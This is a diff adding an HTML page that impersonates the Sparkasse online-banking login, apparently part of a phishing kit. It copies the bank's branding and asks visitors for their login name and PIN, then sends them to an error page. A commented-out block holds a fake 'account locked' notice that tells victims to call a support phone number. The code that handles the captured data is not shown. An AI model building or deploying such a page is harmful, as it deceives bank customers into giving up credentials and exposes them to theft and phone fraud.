@@ -1,0 +1,413 @@
+<!doctype html>
+<html lang="en">
+  <head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158588778-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158588778-1');
+</script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Login Online - Sparkasse Banking</title>
+    <link rel="icon" type="image/x-icon" href="assets/images/favicon.png">
+     <!-- Bootstrap CSS -->
+     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+    <!-- custom css -->
+    <link rel="stylesheet" href="assets/css/style.css">
+  </head>
+  <body>
+<div class="top__seciton d-flex ms-3">
+    <div class="one__buton d-flex align-items-center me-3">
+      <h4 class="mb-0 colrf00">Privatkunden</h4>
+    </div>
+    <div class="one__buton d-flex align-items-center">
+      <h4 class="mb-0">Firmenkunden</h4>
+    </div>
+</div>
+
+<header class="d-flex justify-content-between align-items-center px-3">
+  <div class="header__left__side">
+    <img src="assets/images/logo__spk_main.png" alt="">
+  </div>
+  <div class="right__left__side d-flex justify-content-center align-items-center">
+    <h6 class="mb-0">DE</h6>
+  </div>
+</header>
+<main>
+  <div class="container-fluid p-0 d-block d-lg-none">
+    <div class="col-12">
+      <div class="hamburgr d-block d-lg-none ps-3">
+        <i class="fa-solid fa-bars"></i>
+      </div>
+    </div>
+    <div class="header__section  d-none">
+      <div class="cross__head p-3">
+        <h2>
+          Alle Themen
+        </h2>
+      <div class="close__sparkas">
+        <i class="fa-solid fa-circle-xmark"></i>
+      </div>
+    </div>
+      <ul class="navbar-nav">
+        <li class="nav-item px-3 text-center me-1">
+          <a class="nav-link" href="#">Produkte</a>
+        </li>
+        <li class="nav-item px-3 text-center me-1">
+          <a class="nav-link" href="#">Private Banking</a>
+        </li>
+        <li class="nav-item px-3 text-center me-1">
+          <a class="nav-link" href="#">Junge Kunden</a>
+        </li>
+        <li class="nav-item px-3 text-center me-1">
+          <a class="nav-link" href="#">Ihre Sparkasse</a>
+        </li>
+        <li class="nav-item px-3 text-center">
+          <a class="nav-link" href="#">Service-Center</a>
+        </li>
+      </ul>
+    </div>
+  </div>
+  <div class="container">
+    <div class="row d-flex justify-content-center">
+      <div class="col-md-9 w980 d-none d-lg-block">
+          <div class="header__section d-flex justify-content-center pt-3">
+            <ul class="navbar-nav d-flex flex-row">
+              <li class="nav-item custom__width me-1">
+                <a class="nav-link">
+                  <i class="fa-solid fa-house-chimney"></i>
+                </a>
+              </li>
+              <li class="nav-item px-3 text-center me-1">
+                <a class="nav-link text-white" href="#">Produkte</a>
+              </li>
+              <li class="nav-item px-3 text-center me-1">
+                <a class="nav-link text-white" href="#">Private Banking</a>
+              </li>
+              <li class="nav-item px-3 text-center me-1">
+                <a class="nav-link text-white" href="#">Junge Kunden</a>
+              </li>
+              <li class="nav-item px-3 text-center me-1">
+                <a class="nav-link text-white" href="#">Ihre Sparkasse</a>
+              </li>
+              <li class="nav-item px-3 text-center">
+                <a class="nav-link text-white" href="#">Service-Center</a>
+              </li>
+            </ul>
+          </div>
+      </div>
+      <div class="col-md-9">
+        <div class="form__error__section mb-5">
+          <div class="form__heading d-flex justify-content-start mt-4 mb-2 mt-lg-5 mb-lg-3">
+          <h2>Online-Banking: Login</h2>
+        </div>
+<!-- <div class="eror__div_shw d-none">
+  <p class="text-danger fw-bold mb-0"> Sicherheitsgründen wurde Ihr Konto gesperrt. Bitte wenden Sie sich umgehend an unseren Kundensupport <span class="fs-5"> +49 211 385 33642* Fehlercode - SP-401</span> </p>
+</div> -->
+    <form class="custom__sparkar bg-white p-3">
+      <div class="mb-3 d-flex flex-column">
+        <h3>Ihre Zugangsdaten</h3>
+        
+      </div>
+      <div class="error__code_sparkse d-flex justify-content-end d-none">
+        <p class="text-danger">Bitte befüllen Sie das Feld "Anmeldename".</p>
+      </div>
+      <div class="mb-3 d-flex">
+        <div class="w220 d-flex justify-content-end me-3">
+          <label for="usercardNumber_sparkse" class="form-label">Anmeldename:</label>
+        </div>
+        <div class="w215">
+          <input type="email" class="form-control" id="usercardNumber_sparkse">
+        </div>
+      </div>
+      <div class="error__codePassword_sparkse d-flex justify-content-end d-none">
+        <p class="text-danger">Bitte befüllen Sie das Feld "PIN".</p>
+      </div>
+      <div class="mb-3 d-flex">
+        <div class="w220 d-flex justify-content-end me-3">
+          <label for="usercardPassword_sparkse" class="form-label">Pin:</label>
+        </div>
+        <div class="w215">
+          <input type="password" class="form-control" id="usercardPassword_sparkse">
+        </div>
+      </div>
+      <div class="button__section">
+        <div class="bnt_top d-flex justify-content-end">
+          <a href="">
+            <span>
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-lock" viewBox="0 0 16 16">
+              <path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2zM5 8h6a1 1 0 0 1 1 1v5a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V9a1 1 0 0 1 1-1z"/>
+            </svg>
+          </span>Sicherheitshinweise
+          </a>
+        </div>
+        <div class="bnt_bottm d-flex justify-content-end">
+          <a href="error.html"  type="button" class="btn btn-danger click_sw_error_sparkse">Sicher anmelden <i class="fa-solid fa-circle-chevron-right"></i></a>
+        </div>
+      </div>      
+    </form>
+  </div>
+<div class="links mb-3">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-6">
+        <div class="links__sparkas d-flex align-items-center">
+          <div class="links__icons__sparkas">
+            <i class="fa-solid fa-laptop-code"></i>
+          </div>
+          <div class="links__h6_sparkas">
+            Online-Terminvereinbarung
+          </div>
+          <div class="arrow__sparkas">
+<i class="fa-solid fa-arrow-right-long"></i>
+          </div>
+        </div>
+        
+        <div class="links__sparkas d-flex align-items-center">
+          <div class="links__icons__sparkas">
+            <i class="fa-solid fa-pen-to-square"></i>
+          </div>
+          <div class="links__h6_sparkas">
+            Nachricht schreiben
+          </div>
+          <div class="arrow__sparkas">
+<i class="fa-solid fa-arrow-right-long"></i>
+          </div>
+        </div>
+        <div class="links__sparkas d-flex align-items-center">
+          <div class="links__icons__sparkas">
+            <i class="fa-solid fa-clock"></i>
+          </div>
+          <div class="links__h6_sparkas">
+            Öffnungszeiten
+          </div>
+          <div class="arrow__sparkas">
+<i class="fa-solid fa-arrow-right-long"></i>
+          </div>
+        </div>
+        <div class="links__sparkas d-flex align-items-center">
+          <div class="links__icons__sparkas">
+            <i class="fa-solid fa-laptop"></i>
+          </div>
+          <div class="links__h6_sparkas">
+            Freistellungsauftrag online
+          </div>
+          <div class="arrow__sparkas">
+<i class="fa-solid fa-arrow-right-long"></i>
+          </div>
+        </div>
+      </div>
+      <div class="col-md-6">
+        <div class="links__sparkas d-flex align-items-center">
+          <div class="links__icons__sparkas">
+            <i class="fa-solid fa-calculator"></i>
+          </div>
+          <div class="links__h6_sparkas">
+            IBAN & BIC berechnen
+          </div>
+          <div class="arrow__sparkas">
+<i class="fa-solid fa-arrow-right-long"></i>
+          </div>
+        </div>
+        <div class="links__sparkas d-flex align-items-center">
+          <div class="links__icons__sparkas">
+            <i class="fa-solid fa-laptop-code"></i>
+          </div>
+          <div class="links__h6_sparkas">
+            Online-Kunde werden
+          </div>
+          <div class="arrow__sparkas">
+<i class="fa-solid fa-arrow-right-long"></i>
+          </div>
+        </div>
+        <div class="links__sparkas d-flex align-items-center">
+          <div class="links__icons__sparkas">
+            <i class="fa-solid fa-lock"></i>
+          </div>
+          <div class="links__h6_sparkas">
+            Tageslimit ändern
+          </div>
+          <div class="arrow__sparkas">
+<i class="fa-solid fa-arrow-right-long"></i>
+          </div>
+        </div>
+        <div class="links__sparkas d-flex align-items-center">
+          <div class="links__icons__sparkas">
+            <i class="fa-solid fa-truck"></i>
+          </div>
+          <div class="links__h6_sparkas">
+            Mobile Geschäfsstelle
+          </div>
+          <div class="arrow__sparkas">
+<i class="fa-solid fa-arrow-right-long"></i>
+          </div>
+        </div>
+        <div class="links__sparkas d-flex align-items-center">
+          <div class="links__h6_sparkas">
+            Alle Services und Formulare
+          </div>
+          <div class="arrow__sparkas">
+<i class="fa-solid fa-arrow-right-long"></i>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+</div>
+</div>
+</main>
+<footer class="top">
+  <div class="footer_top d-none d-lg-block" style="background-color: #666">
+    <div class="container w980">
+    <div class="row mt-3 mb-2">
+    <div class="col-md-3">
+      <h2 class="text-white">Rund ums Konto</h2>
+      <p class="text-white">Girokonto</p>
+      <p class="text-white">Kreditkarte</p>
+      <p class="text-white">Dispositionskredit</p>
+      <p class="text-white">Immobilie und Finanzierung</p>
+      <p class="text-white">Privatkredit</p>
+      <p class="text-white">Kartenverlust</p>
+    </div>
+    <div class="col-md-3">
+      <h2 class="text-white">Online-Produkte </h2>
+      <p class="text-white">Tagesgeldkonto</p>
+      <p class="text-white">Sparkassenbuch Digital</p>
+      <p class="text-white">PS-Sparen und Gewinnen</p>
+      <p class="text-white">Klicksparen</p>
+      <p class="text-white">LBS-Bausparen</p>
+      <p class="text-white">SV-Versicherungen</p>
+    </div>
+    <div class="col-md-3">
+      <h2 class="text-white">Banking</h2>
+      <p class="text-white">Online-Banking</p>
+      <p class="text-white">Computercheck</p>
+      <p class="text-white">Elektronisches Postfach</p>
+      <p class="text-white">Sparkassen-Apps</p>
+      <p class="text-white">iTunes Gutscheincodes</p>
+      <p class="text-white">Kontowecker</p>
+    </div>
+    <div class="col-md-3">
+      <h2 class="text-white">Services</h2>
+        <p class="text-white">Service-Center</p>
+        <p class="text-white">Filialen und Öffnungszeiten</p>
+        <p class="text-white">IBAN-Rechner</p>
+        <p class="text-white">Börseninformationen</p>
+        <p class="text-white">SparkassenShop</p>
+        <p class="text-white">Ausbildung und Karriere</p>
+    </div>
+  </div>
+  </div>
+  </div>
+  <div class="footer_middel" style="background-color: #666">
+    <div class="container w980">
+      <div class="row">
+        <div class="col-lg-4 custom__wid">
+          <div class="box d-flex justify-content-center">
+            <div class="box_img">
+              <img src="assets/images/1593175454104.jpg" alt="" class="img-fluid" style="max-width: 80px;">
+            </div>
+            <div class="box_text">
+              <h3 class="chote d-none d-lg-block">Ihre Sparkasse überzeugt</h3>
+              <p class="d-none d-lg-block">
+                Qualität und Kompetenz in der Kundenberatung bei Banken und Sparkassen haben in Ulm eine herausragende Top-Adresse: Die Sparkasse Ulm hat von den unabhängigen Bankentestern des Deutschen Instituts für
+                Bankentests GmbH die bemerkenswerte Gesamtnote „Sehr gut“ erhalten.
+            </p>
+            </div>
+          </div>
+        </div>
+        <div class="col-lg-4 custom__wid">
+          <div class="box d-flex justify-content-center">
+            <div class="box_img">
+              <img src="assets/images/1593175477097.png" alt="" class="img-fluid" style="max-width: 80px;">
+            </div>
+            <div class="box_text">
+              <h3 class="chote d-none d-lg-block">LEADING EMPLOYER</h3>
+              <p class="d-none d-lg-block">
+                Wir gehören zu den Top 1 % der Arbeitgeber in Deutschland! Aus über 70.000 Unternehmen wurden die LEADING EMPLOYER für ihre herausragende Qualität und Attraktivität ausgezeichnet.
+            </p>
+            </div>
+          </div>
+        </div>
+        <div class="col-lg-4 custom__wid">
+          <div class="box d-flex justify-content-center">
+            <div class="box_img">
+              <img src="assets/images/1593175496155.jpg" alt="" class="img-fluid" style="max-width: 80px;">
+            </div>
+            <div class="box_text">
+              <h3 class="chote d-none d-lg-block">Beste Banken-Apps - Höchstnote für Sparkasse</h3>
+              <p class="d-none d-lg-block">
+               
+                Bankgeschäfte über das Smartphone werden immer beliebter und die Apps immer ausgeklügelter. Das Münchener Analysehaus tetralog hat für CAPITAL erstmals 26 Banking-Apps untersucht, die im Februar 2019
+                in Deutschland auf dem Markt waren
+            </p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="footer_bottom">
+    <div class="container w980">
+      <div class="row">
+        <div class="col-lg-9">
+<ul class="d-lg-flex">
+  <li><a href="#" class="p-2 text-decoration-none">AGB</a></li>
+  <li><a href="#" class="p-2 text-decoration-none">Datenschutz</a></li>
+  <li><a href="#" class="p-2 text-decoration-none">Impressum</a></li>
+  <li><a href="#" class="p-2 text-decoration-none">Preise und Hinweise</a></li>
+  <li><a href="#" class="p-2 text-decoration-none">Kontakt</a></li>
+  <li><a href="#" class="p-2 text-decoration-none">Filialen</a></li>
+  <li><a href="#" class="p-2 text-decoration-none">Geldautomaten</a></li>
+</ul>
+</div>
+<div class="col-lg-3">
+  <ul class="d-flex justify-content-center mb-0">
+    <li class="justify-content-center d-flex align-items-center">
+      <a href="" class="me-1">
+        <img src="assets/images/footer___links.jpg" alt="" class="d-none d-lg-block">
+        <img src="assets/images/footer___twolinks.jpg" alt="" class="d-block d-lg-none">
+      </a>
+    </li>
+    <li class="justify-content-center d-flex align-items-center">
+      <a href="">
+        <div class="round_circle d-flex justify-content-center align-items-center me-2">
+        <i class="fa-solid fa-envelope"></i>
+      </div>
+      </a>
+    </li>
+    <li class="justify-content-center d-flex align-items-center">
+      <a href="">
+        <div class="round_circle d-flex justify-content-center align-items-center me-2">
+        <i class="fa-solid fa-calendar-days"></i>
+      </div>
+      </a>
+    </li>
+    <li class="justify-content-center d-flex align-items-center">
+      <a href="">
+        <div class="round_circle d-flex justify-content-center align-items-center">
+        <i class="fa-solid fa-video"></i>
+      </div>
+      </a>
+    </li>
+  </ul>
+</div>
+</div>
+</div>
+  </div>
+</footer>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/js/all.min.js" integrity="sha512-6PM0qYu5KExuNcKt5bURAoT6KCThUmHRewN3zUFNaoI6Di7XJPTMoT6K0nsagZKk2OB4L7E3q1uQKHNHd4stIQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
+<script src="assets/js/custom.js"></script>
+
+</body>
+</html>
